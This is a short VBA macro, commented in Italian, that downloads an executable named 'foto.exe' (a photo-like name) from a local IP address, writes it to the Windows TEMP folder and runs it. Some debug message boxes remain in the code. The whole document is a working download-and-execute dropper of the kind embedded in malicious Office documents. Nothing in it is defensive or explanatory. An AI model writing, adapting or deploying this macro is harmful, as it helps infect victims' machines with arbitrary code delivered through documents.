
```
Sub DownloadAndRunEXE()
    Dim url As String
    Dim filePath As String
    Dim http As Object
    Dim fileNum As Integer
    Dim fileData() As Byte

    ' URL del file EXE da scaricare
    url = "http://192.168.1.56/foto.exe" ' Sostituisci con l'URL reale

    ' Percorso dove salvare il file
    filePath = Environ("TEMP") & "\foto.exe" ' Salva nel percorso temporaneo
    
    MsgBox Environ("TEMP")

    ' Crea un oggetto XMLHTTP per scaricare il file
    Set http = CreateObject("MSXML2.XMLHTTP")
    http.Open "GET", url, False
    http.send

    ' Controlla se la richiesta è andata a buon fine
    If http.Status = 200 Then
        ' Ottieni i dati del file come array di byte
        fileData = http.responseBody
        
        ' Scrivi i dati del file
        fileNum = FreeFile
        Open filePath For Binary Access Write As #fileNum
        Put #fileNum, 1, fileData
        Close #fileNum
        
        ' Controlla se il file esiste prima di eseguirlo
        If Dir(filePath) <> "" Then
            MsgBox ("ok")
            Shell filePath, vbNormalFocus
            MsgBox ("fine exe")
        Else
            MsgBox "Il file non esiste: " & filePath
        End If
        
    Else
        MsgBox "Errore nel download del file: " & http.Status
    End If

    ' Pulisci
    Set http = Nothing
End Sub
```
